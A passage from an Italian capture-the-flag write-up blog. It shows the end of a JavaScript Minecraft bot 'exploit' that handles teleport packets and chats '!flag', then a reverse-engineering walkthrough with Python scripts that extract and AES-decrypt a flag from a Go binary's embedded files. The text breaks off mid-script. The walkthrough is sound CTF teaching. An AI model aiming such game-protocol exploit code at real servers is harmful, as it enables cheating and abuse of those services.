</span></span><span class="line"><span class="cl">        <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[CHAT] &gt;&gt; !flag&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="nx">bot</span><span class="p">.</span><span class="nx">chat</span><span class="p">(</span><span class="s1">&#39;!flag&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span> <span class="mi">500</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="nx">interval</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">once</span><span class="p">(</span><span class="s1">&#39;spawn&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="nx">startMovement</span><span class="p">(</span><span class="s1">&#39;spawn&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">once</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">movementStarted</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[WARN] Spawn not seen after 5s; starting anyway...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">startMovement</span><span class="p">(</span><span class="s1">&#39;timeout&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="mi">5000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">debugCount</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">_client</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;packet&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">meta</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">debugCount</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[PKT]&#39;</span><span class="p">,</span> <span class="nx">meta</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nx">debugCount</span><span class="o">++</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">meta</span><span class="p">.</span><span class="nx">name</span> <span class="o">===</span> <span class="s1">&#39;player_position_and_look&#39;</span> <span class="o">||</span> <span class="nx">meta</span><span class="p">.</span><span class="nx">name</span> <span class="o">===</span> <span class="s1">&#39;position&#39;</span> <span class="o">||</span> <span class="nx">meta</span><span class="p">.</span><span class="nx">name</span> <span class="o">===</span> <span class="s1">&#39;position_look&#39;</span> <span class="o">||</span> <span class="nx">meta</span><span class="p">.</span><span class="nx">name</span> <span class="o">===</span> <span class="s1">&#39;player_position&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">hasTeleportId</span> <span class="o">=</span> <span class="k">typeof</span> <span class="nx">data</span><span class="p">.</span><span class="nx">teleportId</span> <span class="o">===</span> <span class="s1">&#39;number&#39;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">hasTeleportId</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">bot</span><span class="p">.</span><span class="nx">_client</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;teleport_confirm&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">teleportId</span><span class="o">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">teleportId</span> <span class="p">})</span>
</span></span><span class="line"><span class="cl">          <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[NET] Confirmed teleport id&#39;</span><span class="p">,</span> <span class="nx">data</span><span class="p">.</span><span class="nx">teleportId</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[NET] Teleport confirm write failed:&#39;</span><span class="p">,</span> <span class="nx">e</span><span class="o">?</span><span class="p">.</span><span class="nx">message</span> <span class="o">||</span> <span class="nx">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nx">teleportReady</span> <span class="o">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">hasXYZ</span> <span class="o">=</span> <span class="k">typeof</span> <span class="nx">data</span><span class="p">.</span><span class="nx">x</span> <span class="o">===</span> <span class="s1">&#39;number&#39;</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">data</span><span class="p">.</span><span class="nx">y</span> <span class="o">===</span> <span class="s1">&#39;number&#39;</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">data</span><span class="p">.</span><span class="nx">z</span> <span class="o">===</span> <span class="s1">&#39;number&#39;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">hasXYZ</span> <span class="o">&amp;&amp;</span> <span class="nx">movementState</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">movementState</span><span class="p">.</span><span class="nx">cur</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vec3</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span> <span class="nx">data</span><span class="p">.</span><span class="nx">y</span><span class="p">,</span> <span class="nx">data</span><span class="p">.</span><span class="nx">z</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[SYNC] Cur pos updated from server packet&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">movementStarted</span><span class="p">)</span> <span class="nx">startMovement</span><span class="p">(</span><span class="s1">&#39;server-position&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">main</span><span class="p">().</span><span class="k">catch</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><blockquote>
<p>N.B.: Questo exploit √® praticamente lo stesso di <a href="https://pascalctf.github.io/en/ctf/ctfatac/#minecrafty"><code>Minecrafty originale</code></a></p>
</blockquote>
<h3 id="volatile">Volatile<a hidden class="anchor" aria-hidden="true" href="#volatile">#</a></h3>
<h4 id="analisi-16">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi-16">#</a></h4>
<p>Analizzando il file ho capito che era un binario scritto in GO in cui la funzione <code>main.main</code> a <code>0x5309e0</code> costruiva un <code>afero.MemMapFs</code> sopra una tabella di file embedded e leggeva due path (<code>unk_5BCEE4</code> -&gt; <code>e/f1</code>, <code>unk_5BCEE8</code> -&gt; <code>e/f2</code>) tramite <code>github_com_spf13_afero_ReadFile</code>. La tabella stessa √® una slice <code>[]internal/embed/file</code> a <code>0x604360</code>, il cui header (<code>ptr=0x604378, len=3</code>) punta a tre voci: directory <code>e/</code>, e file <code>e/f1</code> e <code>e/f2</code>. Ogni voce memorizza puntatore/lunghezza della stringa Go sia per il path sia per i dati del file, quindi dumpando le stringhe a quegli indirizzi si recuperano i payload. <code>e/f1</code> era la stringa ASCII di 32 byte <code>6b90408b52818c16e4e3fd2e8acb40d6</code>, mentre <code>e/f2</code> conteneva un ciphertext base64 da 128 byte che iniziava con <code>RLJwwmLd1PETlctb...PlPGI</code>.</p>
<p>Continuando nell‚Äôanalisi di <code>main.main</code> ho capito che chiamava <code>encoding/base64.StdEncoding.DecodeString</code> su <code>e/f2</code>, prendeva i primi 16 byte decodificati come IV, e decrittava il resto con <code>crypto/aes.NewCipher</code> + <code>cipher.NewCBCDecrypter</code> usando i byte grezzi di <code>e/f1</code>. Il plaintext veniva poi scritto in <code>/uwu/flag.txt</code>, quindi ricreare quella routine offline riproduce la flag senza eseguire il binario target.</p>
<h4 id="soluzione-13">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-13">#</a></h4>
<ol>
<li>
<p>Ho usato <code>extract_embed_fs.py</code> per parsare la slice a <code>0x604360</code> e dumpare <code>extracted/e/f1</code> e <code>extracted/e/f2</code> direttamente da <code>.rodata</code>. Lo script converte gli indirizzi virtuali in offset di file usando la base di <code>.rodata</code> (<code>0x56b000</code>) osservata in IDA, quindi niente hex-editing manuale:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> Downloads
</span></span><span class="line"><span class="cl">python extract_embed_fs.py
</span></span></code></pre></div></li>
<li>
<p>Ho decrittato <code>e/f2</code> con il flusso AES-CBC rispecchiato da <code>main.main</code>. <code>decrypt_flag.py</code> decodifica in base64 il blob, separa IV+ciphertext, decritta, rimuove il padding PKCS#7, stampa il plaintext e lo scrive dove lo avrebbe messo il binario (<code>uwu/flag.txt</code>):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python decrypt_flag.py
</span></span></code></pre></div></li>
</ol>
<p>Cos√¨ si ottiene la flag come avrebbe fatto il binario.</p>
<h4 id="script-12">Script<a hidden class="anchor" aria-hidden="true" href="#script-12">#</a></h4>
<h5 id="estrazione-embed-fs">Estrazione Embed FS<a hidden class="anchor" aria-hidden="true" href="#estrazione-embed-fs">#</a></h5>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">annotations</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">RODATA_VADDR</span> <span class="o">=</span> <span class="mh">0x56B000</span>
</span></span><span class="line"><span class="cl"><span class="n">RODATA_FOFFSET</span> <span class="o">=</span> <span class="mh">0x16B000</span>
</span></span><span class="line"><span class="cl"><span class="n">FILE_SLICE_ADDR</span> <span class="o">=</span> <span class="mh">0x604360</span>
</span></span><span class="line"><span class="cl"><span class="n">FILE_ENTRY_SIZE</span> <span class="o">=</span> <span class="mi">48</span>  <span class="c1"># sizeof(string) + sizeof(string) + 16-byte hash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">vaddr_to_offset</span><span class="p">(</span><span class="n">vaddr</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="n">vaddr</span> <span class="o">&lt;</span> <span class="n">RODATA_VADDR</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;virtual address 0x</span><span class="si">{</span><span class="n">vaddr</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2"> is outside .rodata&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">RODATA_FOFFSET</span> <span class="o">+</span> <span class="p">(</span><span class="n">vaddr</span> <span class="o">-</span> <span class="n">RODATA_VADDR</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_slice_header</span><span class="p">(</span><span class="n">blob</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">tuple</span><span class="p">[</span><span class="nb">int</span><span class="p">,</span> <span class="nb">int</span><span class="p">,</span> <span class="nb">int</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">blob</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">24</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;expected 24-byte slice header&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;&lt;QQQ&#34;</span><span class="p">,</span> <span class="n">blob</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_string</span><span class="p">(</span><span class="n">fh</span><span class="p">,</span> <span class="n">ptr</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">length</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="n">fh</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="n">vaddr_to_offset</span><span class="p">(</span><span class="n">ptr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">fh</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">length</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_bytes</span><span class="p">(</span><span class="n">fh</span><span class="p">,</span> <span class="n">ptr</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">length</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="n">fh</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="n">vaddr_to_offset</span><span class="p">(</span><span class="n">ptr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">fh</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">length</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_entries</span><span class="p">(</span><span class="n">binary</span><span class="p">:</span> <span class="n">Path</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">list</span><span class="p">[</span><span class="nb">tuple</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">]]:</span>
</span></span><span class="line"><span class="cl">   <span class="n">entries</span><span class="p">:</span> <span class="nb">list</span><span class="p">[</span><span class="nb">tuple</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">]]</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">   <span class="k">with</span> <span class="n">binary</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="n">fh</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="n">vaddr_to_offset</span><span class="p">(</span><span class="n">FILE_SLICE_ADDR</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">      <span class="n">ptr</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">capacity</span> <span class="o">=</span> <span class="n">read_slice_header</span><span class="p">(</span><span class="n">fh</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">24</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="n">length</span> <span class="o">!=</span> <span class="n">capacity</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">         <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;embed.FS file table length mismatch&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">table_off</span> <span class="o">=</span> <span class="n">vaddr_to_offset</span><span class="p">(</span><span class="n">ptr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">         <span class="n">fh</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="n">table_off</span> <span class="o">+</span> <span class="n">idx</span> <span class="o">*</span> <span class="n">FILE_ENTRY_SIZE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">         <span class="n">chunk</span> <span class="o">=</span> <span class="n">fh</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">FILE_ENTRY_SIZE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">         <span class="n">path_ptr</span><span class="p">,</span> <span class="n">path_len</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack_from</span><span class="p">(</span><span class="s2">&#34;&lt;QQ&#34;</span><span class="p">,</span> <span class="n">chunk</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">         <span class="n">data_ptr</span><span class="p">,</span> <span class="n">data_len</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack_from</span><span class="p">(</span><span class="s2">&#34;&lt;QQ&#34;</span><span class="p">,</span> <span class="n">chunk</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">         <span class="n">path</span> <span class="o">=</span> <span class="n">read_string</span><span class="p">(</span><span class="n">fh</span><span class="p">,</span> <span class="n">path_ptr</span><span class="p">,</span> <span class="n">path_len</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">         <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="k">if</span> <span class="n">data_len</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">read_bytes</span><span class="p">(</span><span class="n">fh</span><span class="p">,</span> <span class="n">data_ptr</span><span class="p">,</span> <span class="n">data_len</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">         <span class="n">entries</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">path</span><span class="p">,</span> <span class="n">data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">entries</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">   <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="vm">__doc__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;--binary&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">default</span><span class="o">=</span><span class="s2">&#34;volatile&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nb">type</span><span class="o">=</span><span class="n">Path</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">help</span><span class="o">=</span><span class="s2">&#34;path to the Go binary (default: ./volatile)&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;--outdir&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">default</span><span class="o">=</span><span class="n">Path</span><span class="p">(</span><span class="s2">&#34;extracted&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">      <span class="nb">type</span><span class="o">=</span><span class="n">Path</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">help</span><span class="o">=</span><span class="s2">&#34;directory for extracted payloads (default: ./extracted)&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="n">args</span><span class="o">.</span><span class="n">outdir</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="n">parents</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">entries</span> <span class="o">=</span> <span class="n">parse_entries</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">binary</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="k">for</span> <span class="n">path</span><span class="p">,</span> <span class="n">data</span> <span class="ow">in</span> <span class="n">entries</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">         <span class="k">continue</span>
</span></span><span class="line"><span class="cl">      <span class="n">out_path</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">outdir</span> <span class="o">/</span> <span class="n">path</span>
</span></span><span class="line"><span class="cl">      <span class="n">out_path</span><span class="o">.</span><span class="n">parent</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="n">parents</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">out_path</span><span class="o">.</span><span class="n">write_bytes</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Wrote </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="si">:</span><span class="s2">4d</span><span class="si">}</span><span class="s2"> bytes -&gt; </span><span class="si">{</span><span class="n">out_path</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div><h5 id="decrittazione-file">Decrittazione file<a hidden class="anchor" aria-hidden="true" href="#decrittazione-file">#</a></h5>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">annotations</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">path</span><span class="p">:</span> <span class="n">Path</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="n">data</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">read_bytes</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2"> is empty&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">data</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">unpad</span><span class="p">(</span><span class="n">block</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="n">pad_len</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="n">pad_len</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">pad_len</span> <span class="o">&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">block</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">      <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;invalid padding&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="n">block</span><span class="p">[</span><span class="o">-</span><span class="n">pad_len</span><span class="p">:]</span> <span class="o">!=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">pad_len</span><span class="p">])</span> <span class="o">*</span> <span class="n">pad_len</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;padding bytes mismatch&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">block</span><span class="p">[:</span><span class="o">-</span><span class="n">pad_len</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="vm">__doc__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
